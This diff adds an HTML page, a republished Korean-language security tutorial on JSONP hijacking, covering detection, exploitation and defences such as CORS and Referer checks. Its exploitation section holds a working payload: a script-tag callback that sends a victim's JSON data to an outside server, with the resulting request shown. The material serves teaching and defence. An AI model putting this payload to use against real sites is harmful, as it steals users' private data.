@@ -1,0 +1,78 @@
+<!doctype html>
+<html lang="ko">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>JSONP Hijacking — PIXN</title>
+  <meta name="description" content="JSONP Hijacking — Vulnerabilities, attack surfaces, and defensive verification notes.">
+  <meta property="og:title" content="JSONP Hijacking — PIXN"><meta property="og:description" content="JSONP Hijacking — Vulnerabilities, attack surfaces, and defensive verification notes."><meta property="og:image" content="https://whgusals84.github.io/pixn-security/og.png"><meta name="twitter:card" content="summary_large_image">
+  <link rel="icon" href="/favicon.svg" type="image/svg+xml">
+  <link rel="stylesheet" href="/assets/style.css">
+</head>
+<body>
+  <header data-site-header data-active="reference"></header>
+  <main class="page article-page" id="main">
+    <header class="article-heading">
+      <p class="eyebrow"><a href="/reference/">Reference</a> / <a href="/reference/attack/">Web Security</a></p>
+      <h1>JSONP Hijacking</h1>
+      <time datetime="2021-09-05">SEPTEMBER 5, 2021</time>
+    </header>
+    <article class="article-body"><h2 id="introduction">Introduction</h2>
+<p>JSONP Hijacking은 민감 정보를 처리하는 페이지가 JSONP를 지원하는 경우 공격자가 쉽게 정보를 탈취할 수 있는 공격 방법을 의미합니다.</p>
+<h3 id="jsonp">JSONP</h3>
+<p>JSONP는 CORS 정책으로 SOP에 예외를 두고 통신하기 어려운 서비스에서 택하는 방법으로 Reseponse 데이터 내 callback으로 사용할 함수를 미리 명시하여 <code>&lt;script src=''&gt;</code> 로 데이터를 읽을 수 있도록 지원하는 방법입니다.</p>
+<p><strong>Request</strong></p>
+<pre><code>GET /user/info?callback=func1 HTTP/1.1
+</code></pre>
+<p><strong>Response</strong></p>
+<pre><code class="language-javascript hljs">func1<span class="hljs-punctuation">(</span><span class="hljs-punctuation">{</span><span class="hljs-string">&quot;data&quot;</span><span class="hljs-operator">:</span><span class="hljs-string">&quot;this_is_user_info_data&quot;</span><span class="hljs-punctuation">}</span><span class="hljs-punctuation">)</span>
+</code></pre>
+<h2 id="offensive-techniques">Offensive techniques</h2>
+<h3 id="detect">Detect</h3>
+<p>jsonp를 명시적으로 사용하고 있는 페이지는 바로 식별이 가능하며, 일반 페이지에서도 서비스 코드나 설정에 따라서 callback, jsonp 등의 function이 response에 반영될 수 있습니다.</p>
+<pre><code>[ Request ]
+GET /user/info?jsonp=check HTTP/1.1
+
+[ Response ]
+HTTP/1.1 200 OK
+
+check{
+	&quot;data&quot;:&quot;data&quot;
+}
+</code></pre>
+<p>이러한 경우 공격자가 response 코드를 제어할 수 있어서 본인이 callback 받을 함수를 만들고 정보를 리턴받을 수 있습니다.</p>
+<pre><code>[ Request ]
+GET /user/info?jsonp=check= HTTP/1.1
+
+[ Reponse ]
+HTTP/1.1 200 OK
+
+check={
+	&quot;data&quot;:&quot;data&quot;
+}
+</code></pre>
+<pre><code class="language-javascript hljs"><span class="hljs-comment">// 공격자의 callback 페이지
+</span><span class="hljs-comment"></span>console<span class="hljs-punctuation">.</span>log<span class="hljs-punctuation">(</span>JSON<span class="hljs-punctuation">.</span>stringify<span class="hljs-punctuation">(</span>check<span class="hljs-punctuation">)</span><span class="hljs-punctuation">)</span>
+</code></pre>
+<h3 id="exploitation">Exploitation</h3>
+<p>보통 JSONP 페이지는 JSON 포맷의 Reseponse를 사용하기 때문에 <code>JSON.stringify()</code> 함수는 데이터를 탈취하기 위한 아주 좋은 함수가 됩니다. <code>JSON.stringify()</code> 는 JSON 데이터를 String으로 변환하는 함수인데, 이를 이용해서 Response의 JSON 데이터 전문을 파싱하지 않고 바로 얻어올 수 있습니다.</p>
+<pre><code class="language-html hljs"><span class="hljs-punctuation">&lt;</span><span class="hljs-name">script</span> <span class="hljs-attr">src</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;target.domain.com/getData?callback=document.location.href=&#39;https://www.hahwul.com?&#39;+JSON.stringify&quot;</span><span class="hljs-punctuation">&gt;</span><span class="hljs-punctuation">&lt;</span><span class="hljs-punctuation">/</span><span class="hljs-name">script</span><span class="hljs-punctuation">&gt;</span>
+</code></pre>
+<pre><code class="language-javascript hljs"><span class="hljs-built_in">document</span><span class="hljs-punctuation">.</span>location<span class="hljs-punctuation">.</span>href<span class="hljs-operator">=</span><span class="hljs-string">&#39;https://www.hahwul.com?&#39;</span><span class="hljs-operator">+</span>JSON<span class="hljs-punctuation">.</span>stringify<span class="hljs-punctuation">(</span><span class="hljs-punctuation">{</span><span class="hljs-string">&quot;name&quot;</span><span class="hljs-operator">:</span><span class="hljs-string">&quot;data~~&quot;</span><span class="hljs-punctuation">}</span><span class="hljs-punctuation">)</span>
+</code></pre>
+<p><strong>Attacker Server</strong></p>
+<pre><code>GET /?{\&quot;name\&quot;:\&quot;data~~~~\&quot;}
+Host: www.hahwul.com
+</code></pre>
+<h2 id="defensive-techniques">Defensive techniques</h2>
+<p>기본적으로 JSONP 자체가 안전한 구조는 아니라서 가급적 SOP를 준수할 수 있도록 CORS 설정을 통해 통신해야합니다. 다만 서비스 특성 상 JSONP를 사용해야하는 경우 가급적 중요한 정보를 최대한 다루지 않는 것이 좋으며,  Referer 헤더 등으로 요청이 발생한 구간을 검증하는 것이 좋습니다.</p>
+<p>(물론 Referer 검증할꺼면 CORS로 구현해서 SOP를 준수하는게 더 좋죠)</p>
+<h2 id="references">References</h2>
+<ul>
+<li>https://www.hahwul.com/2019/07/28/json-hijacking-with-script-src/</li>
+</ul></article>
+    <footer class="article-source"><span>Republished with permission</span><a href="https://www.hahwul.com/cullinan/attack/jsonp-hijacking/" rel="noopener noreferrer">Original source ↗</a></footer>
+  </main>
+  <footer data-site-footer></footer><script src="/assets/site.js"></script>
+</body>
+</html>
